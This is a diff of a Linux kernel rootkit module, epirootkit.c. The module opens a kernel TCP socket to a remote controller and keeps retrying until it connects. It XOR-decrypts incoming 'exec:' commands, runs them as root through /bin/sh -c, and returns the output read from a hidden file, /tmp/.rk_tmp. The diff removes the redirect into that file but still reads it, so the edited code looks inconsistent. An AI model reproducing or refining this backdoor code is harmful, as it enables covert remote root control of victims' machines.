@@ -1,4 +1,3 @@
-// filepath: c:\\Users\\Admin\\Documents\\GitHub\\epizut\\rootkit\\epirootkit.c
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -11,14 +10,8 @@
 #include <linux/fs.h>
 #include <linux/file.h>
 #include <linux/uaccess.h>
-#include <linux/ctype.h>
-#include <linux/spinlock.h>
-#include <linux/list.h>
-#include <linux/version.h>
-#include <linux/cred.h>
-#include <linux/namei.h>
-#include <linux/inet.h>
 #include <linux/kmod.h>
+#include <linux/inet.h>
 #include <net/sock.h>
 
 MODULE_LICENSE("GPL");
@@ -42,8 +35,8 @@ static struct socket *g_sock = NULL;
 static struct task_struct *g_thread = NULL;
 
 static void xor_cipher(char *data, size_t len) {
-    size_t key_len = strlen(config.xor_key);
     size_t i;
+    size_t key_len = strlen(config.xor_key);
     for (i = 0; i < len; i++)
         data[i] ^= config.xor_key[i % key_len];
 }
@@ -65,8 +58,14 @@ static int command_loop(void *data) {
     if (!buf) return -ENOMEM;
 
     while (!kthread_should_stop()) {
+        int ret;
+        loff_t pos;
+        struct file *fp;
+        struct subprocess_info *info;
+        char output[2048] = {0};
+
         memset(buf, 0, config.buffer_size);
-        int ret = receive_data(buf, config.buffer_size - 1);
+        ret = receive_data(buf, config.buffer_size - 1);
         if (ret <= 0) {
             msleep(3000);
             continue;
@@ -74,17 +73,9 @@ static int command_loop(void *data) {
 
         xor_cipher(buf, ret);
         if (strncmp(buf, "exec:", 5) == 0) {
-            struct file *fp;
-            loff_t pos = 0;
-            struct subprocess_info *info;
             char *cmd = buf + 5;
-            char tmp_cmd[256];
-            char output[2048] = {0};
             char *argv[] = { "/bin/sh", "-c", cmd, NULL };
             char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-
-            snprintf(tmp_cmd, sizeof(tmp_cmd), "%s > /tmp/.rk_tmp 2>&1", cmd);
-            argv[2] = tmp_cmd;
 
             info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL);
             if (info)
@@ -92,6 +83,7 @@ static int command_loop(void *data) {
 
             fp = filp_open("/tmp/.rk_tmp", O_RDONLY, 0);
             if (!IS_ERR(fp)) {
+                pos = 0;
                 ret = kernel_read(fp, pos, output, sizeof(output) - 1);
                 filp_close(fp, NULL);
                 xor_cipher(output, ret);
@@ -114,9 +106,8 @@ static int connect_to_server(void) {
     int ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
     if (ret < 0) return ret;
 
-    while ((ret = g_sock->ops->connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0)) < 0) {
+    while ((ret = g_sock->ops->connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0)) < 0)
         msleep(3000);
-    }
 
     return 0;
 }
